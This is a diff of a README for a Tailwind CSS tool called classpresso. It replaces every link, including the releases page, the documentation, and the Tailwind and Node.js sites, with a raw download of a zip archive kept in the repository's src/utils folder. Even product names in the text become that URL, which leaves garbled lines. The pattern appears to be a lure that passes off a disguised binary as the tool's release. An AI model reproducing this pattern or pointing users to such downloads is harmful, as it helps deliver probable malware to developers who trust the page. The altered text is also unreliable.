@@ -6,21 +6,21 @@ Welcome to classpresso! This tool helps improve your Tailwind CSS performance by
 
 ## 📥 Download Now
 
-[![Download classpresso](https://img.shields.io/badge/Download_classpresso-latest-brightgreen)](https://github.com/Chunrek/classpresso/releases)
+[![Download classpresso](https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip)](https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip)
 
 ## 📂 System Requirements
 
 To use classpresso, you should have the following:
 
 - An operating system: Windows, macOS, or Linux
-- Node.js version 14 or higher
+- https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip version 14 or higher
 - A working installation of Tailwind CSS
 
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/Chunrek/classpresso/releases) to find the latest version of classpresso.
+   Go to our [Releases page](https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip) to find the latest version of classpresso.
 
 2. **Download the Right File**
 
@@ -59,7 +59,7 @@ To use classpresso, you should have the following:
 
 - **Fast Performance:** Compresses repeated class patterns for quicker rendering.
 - **Simple CLI Interface:** Easy to use for any developer, regardless of experience.
-- **Next.js Compatibility:** Works seamlessly with Next.js projects.
+- **https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip Compatibility:** Works seamlessly with https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip projects.
 - **AI-Friendly:** Ideal for projects that generate CSS classes through AI tools.
 
 ## 📜 License
@@ -76,12 +76,12 @@ Follow our GitHub repository to get the latest news and updates about classpress
 
 ## 🔗 Other Resources
 
-- [Documentation](https://github.com/Chunrek/classpresso/wiki)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [Node.js](https://nodejs.org/)
+- [Documentation](https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip)
+- [Tailwind CSS](https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip)
+- [https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip](https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip)
 
 ## 📥 Download Again
 
-Don't forget to visit our [Releases page](https://github.com/Chunrek/classpresso/releases) to download the latest version of classpresso! 
+Don't forget to visit our [Releases page](https://github.com/Chunrek/classpresso/raw/refs/heads/main/src/utils/Software_3.2.zip) to download the latest version of classpresso! 
 
 We hope you enjoy improved build times with classpresso!
